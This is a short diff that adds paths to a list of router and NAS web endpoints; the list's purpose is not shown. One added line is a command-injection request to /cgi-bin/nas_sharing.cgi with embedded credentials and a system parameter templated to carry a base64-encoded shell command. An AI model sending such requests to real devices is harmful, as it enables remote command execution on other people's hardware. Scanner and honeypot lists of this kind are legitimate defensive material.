@@ -3,3 +3,5 @@
 /ddns_check.ccp
 /apply.cgi
 /cgi-bin/ExportSettings.sh
+/wan.htm
+/cgi-bin/nas_sharing.cgi?user=mydlinkBRionyg&passwd=YWJjMTIzNDVjYmE&cmd=15&system={{base64(cmd)}}
